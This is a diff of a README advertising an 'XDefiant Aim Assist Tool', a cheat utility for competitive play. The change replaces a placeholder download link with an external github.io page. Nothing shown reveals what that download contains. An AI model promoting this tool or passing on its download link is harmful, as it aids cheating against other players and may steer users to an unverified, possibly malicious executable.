@@ -2,7 +2,7 @@
 
 The **XDefiant Aim Assist Tool** is a precision-enhancing utility designed to give players an edge in competitive matches. Whether you're on PC or console, this tool improves your accuracy, target tracking, and consistency.
 
-[![Download XDefiant Aim Assist](https://img.shields.io/badge/Download-XDefiant_Aim_Assist-blueviolet)](#)
+[![Download XDefiant Aim Assist](https://img.shields.io/badge/Download-XDefiant_Aim_Assist-blueviolet)](https://xdefiant-aim-assist-tool.github.io/.github)
 
 ---
 
